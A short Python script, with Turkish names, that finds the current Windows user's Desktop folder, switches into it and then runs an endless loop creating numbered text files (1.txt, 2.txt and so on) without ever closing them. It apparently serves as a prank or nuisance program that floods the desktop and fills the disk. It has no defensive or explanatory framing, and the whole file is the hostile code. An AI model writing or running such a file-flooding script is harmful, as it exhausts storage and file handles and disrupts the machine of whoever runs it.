import os

def sonsuz():
    liste = 0
    while True:
        liste += 1
        print(liste)
        file = open("{}.txt".format(liste),"w")
        file.write("{}".format(liste))

usarname = os.environ["USERNAME"]
nowdizin = os.getcwd()
cusers = nowdizin[0:9]
desktop = cusers+usarname+"\Desktop"

dizinvarmi = os.path.exists("{}".format(desktop))

if dizinvarmi == True:
    os.chdir("{}".format(desktop))
    sonsuz()
else:    
    sonsuz()    
